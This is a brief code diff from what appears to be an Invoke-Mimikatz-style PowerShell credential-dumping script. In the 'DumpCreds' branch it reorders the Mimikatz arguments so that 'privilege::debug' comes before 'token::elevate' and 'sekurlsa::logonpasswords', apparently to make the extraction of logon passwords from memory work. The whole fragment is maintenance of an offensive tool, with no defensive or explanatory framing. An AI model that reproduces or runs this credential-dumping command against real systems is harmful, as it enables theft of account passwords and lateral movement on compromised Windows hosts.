@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "token::elevate privilege::debug sekurlsa::logonpasswords exit"
+		$ExeArgs = "privilege::debug token::elevate sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
